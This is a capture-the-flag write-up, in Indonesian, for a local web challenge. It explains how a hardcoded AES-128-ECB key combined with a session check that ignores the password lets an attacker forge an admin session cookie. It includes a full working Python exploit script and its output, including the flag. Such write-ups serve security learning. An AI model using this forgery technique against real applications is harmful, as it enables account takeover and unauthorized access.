# WriteUp: Kepengin Jadi Admin

## Overview

* **Judul:** Kepengin Jadi Admin
* **Kategori:** Cryptography
* **Poin:** 500
* **Deskripsi:** Sesuai judul, bisa ambil alih akun admin?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `jadi-admin.yml`. Source code utama (`app.js`) didapatkan melalui ekstraksi dari container Docker.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Cryptography/Kepengin Jadi Admin]
└─$ tree
.
├── jadi-admin.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`jadi-admin.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/jadi-admin:latest
    ports:
      - "1337:3000"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Cryptography/Kepengin Jadi Admin]
└─$ PWN=WanZKey docker compose -f jadi-admin.yml up -d --build

```

### 2. Source Code Analysis (White Box)

Melakukan ekstraksi file `app.js` dari container untuk menganalisis logika autentikasi. Ditemukan dua celah fatal.

**Vulnerability 1: Hardcoded Cryptographic Key**
Pada `src/app.js`, kunci enkripsi untuk cookie sesi ditulis secara hardcoded.

```javascript
const ENCRYPTION_KEY = 'secret1234567890'; // 16 bytes
// ...
const cipher = crypto.createCipheriv('aes-128-ecb', ENCRYPTION_KEY, null);

```

Algoritma yang digunakan adalah **AES-128-ECB**. Karena kuncinya diketahui, penyerang dapat membuat (forge) cookie sesi yang valid secara kriptografi.

**Vulnerability 2: Broken Authentication Logic**
Pada fungsi middleware `requireAuth`, terdapat kesalahan logika validasi.

```javascript
function requireAuth(req, res, next) {
    // ... decrypt cookie ...
    const parts = decrypted.split('|||');
    const [username, password] = parts;

    // VULNERABILITY: Hanya mengecek apakah username ada di database
    if (!users[username]) {
        res.clearCookie('session');
        return res.redirect('/login');
    }

    // Password dari cookie TIDAK PERNAH divalidasi dengan password asli di database!
    req.user = { username, role: users[username].role };
    next();
}

```

Sistem mempercayai isi cookie mentah-mentah tanpa memverifikasi password.

### 3. Exploitation Strategy (Session Forgery)

Tujuannya adalah mengakses endpoint `/admin` yang dilindungi.

1. **Target Data:** Format cookie sesi adalah `username|||password`. Kita menargetkan user `admin`.
2. **Payload:** `admin|||dummy_password` (Password bisa diisi sembarang string karena tidak divalidasi).
3. **Encryption:** Enkripsi payload menggunakan **AES-128-ECB** dengan key `secret1234567890` dan padding manual (sesuai implementasi server).
4. **Encoding:** Encode hasil enkripsi ke Base64.
5. **Attack:** Kirim request ke `/admin` dengan cookie `session` yang telah dipalsukan.

## Script Solver

Script Python untuk melakukan *Session Forgery* dan mengambil flag.

**File:** `exploit.py`

```python
import requests
from Crypto.Cipher import AES
import base64
import re

# Konfigurasi dari app.js
TARGET_URL = "http://localhost:1337"
KEY = b'secret1234567890' # Harus 16 bytes

def pad(text):
    # Replikasi padding manual null byte (\0) dari JS
    padding_length = 16 - (len(text) % 16)
    return text + ('\0' * padding_length)

def encrypt_ecb(plaintext):
    cipher = AES.new(KEY, AES.MODE_ECB)
    padded_text = pad(plaintext)
    encrypted = cipher.encrypt(padded_text.encode('utf-8'))
    return base64.b64encode(encrypted).decode('utf-8')

def exploit():
    print(f"[*] Target: {TARGET_URL}")
    print("[*] Vulnerability: Hardcoded Key + Auth Logic Flaw")

    # 1. Forge Cookie
    # Kita butuh login sebagai 'admin'. Password bisa isi apa aja karena gak dicek.
    payload = "admin|||bebas_aja"
    forged_cookie = encrypt_ecb(payload)
    
    print(f"[*] Forged Session Cookie: {forged_cookie}")

    # 2. Kirim Request ke Panel Admin
    cookies = {'session': forged_cookie}
    
    print("[*] Accessing /admin with forged cookie...")
    try:
        r = requests.get(f"{TARGET_URL}/admin", cookies=cookies)
        
        if r.status_code == 200:
            # 3. Ambil Flag
            if "pwn{" in r.text:
                flag = re.search(r'pwn\{.*?\}', r.text)
                print("-" * 50)
                if flag:
                    print(f"[!!!] JACKPOT! FLAG: {flag.group(0)}")
                else:
                    print("[-] Flag pattern found but regex failed.")
                print("-" * 50)
            else:
                print("[-] Login success via forgery, but flag not found in page.")
        else:
            print(f"[-] Access denied. Status Code: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Cryptography/Kepengin Jadi Admin]
└─$ ./exploit.py
[*] Target: http://localhost:1337
[*] Vulnerability: Hardcoded Key + Auth Logic Flaw
[*] Forged Session Cookie: XKRf74U5LwQmrdq6n3xdn6X3m8C3KN7IMv6MwLbrcXE=
[*] Accessing /admin with forged cookie...
--------------------------------------------------
[!!!] JACKPOT! FLAG: pwn{d6e069033061e8e8869a1f84f1a9d873}
--------------------------------------------------

```

## Flag

```
pwn{d6e069033061e8e8869a1f84f1a9d873}

```
